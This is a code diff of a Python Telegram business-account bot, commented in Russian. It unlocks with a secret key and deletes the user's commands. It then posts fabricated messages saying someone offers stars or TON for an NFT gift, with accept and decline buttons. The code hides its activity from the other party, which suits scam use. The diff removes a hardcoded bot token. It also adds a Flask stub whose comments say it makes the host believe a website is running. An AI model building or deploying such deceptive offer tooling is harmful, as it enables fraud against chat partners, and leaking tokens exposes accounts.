@@ -1,31 +1,41 @@
 import re
 import asyncio
 import logging
+import os
+from threading import Thread
+from flask import Flask
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 
 # --- НАСТРОЙКИ ---
-BOT_TOKEN = "9150035187:AAHA1yqlsiU1CwnGECEMP5VX_1cFrG4t0Ho" 
-# Придумай свой секретный ключ. Лучше использовать рандомный набор букв и цифр.
+# Токен берется из переменных окружения Render
+BOT_TOKEN = os.getenv("BOT_TOKEN")
 SECRET_KEY = "/unlock_8f3k2m9x" 
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
 
-# Простейшая база в памяти для хранения авторизованных пользователей.
-# В идеале для продакшена использовать Redis или SQLite.
 AUTHORIZED_USERS = set()
 
-# --- ОБРАБОТЧИК СЕКРЕТНОГО КЛЮЧА ---
+# --- ВЕБ-СЕРВЕР ДЛЯ RENDER ---
+# Render требует, чтобы Web Service слушал порт. Этот блок создает видимость сайта.
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    return "Bot is running!"
+
+def run_flask():
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host="0.0.0.0", port=port)
+
+# --- ЛОГИКА БОТА ---
 @dp.business_message(F.text == SECRET_KEY)
 async def unlock_bot(message: types.Message):
-    # Добавляем ID пользователя (владельца аккаунта) в список разрешенных
     AUTHORIZED_USERS.add(message.from_user.id)
-    
-    # Удаляем сообщение с ключом, чтобы его никто не увидел в истории чата
     try:
         await bot.delete_business_messages(
             business_connection_id=message.business_connection_id,
@@ -33,24 +43,17 @@ async def unlock_bot(message: types.Message):
         )
     except Exception:
         pass
-
-    # Можно отправить тихое уведомление, что бот активирован
     await bot.send_message(
         chat_id=message.chat.id,
         text="✅ Бот активирован. Теперь вы можете использовать /price.",
         business_connection_id=message.business_connection_id
     )
 
-# --- ОСНОВНОЙ ОБРАБОТЧИК ЦЕНЫ ---
 @dp.business_message(F.text.startswith("/price"))
 async def handle_price_command(message: types.Message):
-    # 1. ПРОВЕРКА АВТОРИЗАЦИИ
     if message.from_user.id not in AUTHORIZED_USERS:
-        # Если пользователь не ввел ключ, бот игнорирует команду.
-        # Мы не отправляем ошибку, чтобы посторонние не поняли, что бот "живой".
         return
 
-    # 2. Удаляем команду
     try:
         await bot.delete_business_messages(
             business_connection_id=message.business_connection_id,
@@ -59,10 +62,8 @@ async def handle_price_command(message: types.Message):
     except Exception as e:
         logging.error(f"Не удалось удалить команду: {e}")
 
-    # 3. Парсим команду
     pattern = r"^/price\s+(https?://\S+)\s+([\d\.]+)\s+(gram|stars)$"
     match = re.match(pattern, message.text, re.IGNORECASE)
-    
     if not match:
         return
 
@@ -72,12 +73,8 @@ async def handle_price_command(message: types.Message):
     nft_name_raw = nft_link.split('/')[-1].replace('-', '')
     nft_name_formatted = nft_name_raw.capitalize() 
 
-    if currency == "stars":
-        price_text = f"{price_value} ⭐" 
-    else:
-        price_text = f"{price_value} 💎" 
+    price_text = f"{price_value} ⭐" if currency == "stars" else f"{price_value} 💎"
 
-    # 4. Кнопки
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(text="Отклонить", callback_data="decline_offer"),
@@ -85,7 +82,6 @@ async def handle_price_command(message: types.Message):
         ]
     ])
 
-    # 5. Текст
     final_text = (
         f"Пользователь <a href='tg://user?id={message.from_user.id}'>{message.from_user.full_name}</a>\n"
         f"предлагает вам {price_text} за подарок\n"
@@ -94,7 +90,6 @@ async def handle_price_command(message: types.Message):
         f"{nft_link}"
     )
 
-    # 6. Отправка
     try:
         await bot.send_message(
             chat_id=message.chat.id,
@@ -106,7 +101,6 @@ async def handle_price_command(message: types.Message):
     except Exception as e:
         logging.error(f"Ошибка при отправке: {e}")
 
-# --- КНОПКИ ---
 @dp.callback_query(F.data == "accept_offer")
 async def accept_offer(callback: types.CallbackQuery):
     await callback.answer("Вы приняли предложение! (Тестовое действие)", show_alert=True)
@@ -116,6 +110,8 @@ async def decline_offer(callback: types.CallbackQuery):
     await callback.answer("Вы отклонили предложение. (Тестовое действие)", show_alert=True)
 
 async def main():
+    # Запускаем Flask в фоне, чтобы Render думал, что это сайт
+    Thread(target=run_flask, daemon=True).start()
     print("Бот запущен. Ожидание секретного ключа...")
     await dp.start_polling(bot, allowed_updates=["business_connection", "business_message", "callback_query"])
 
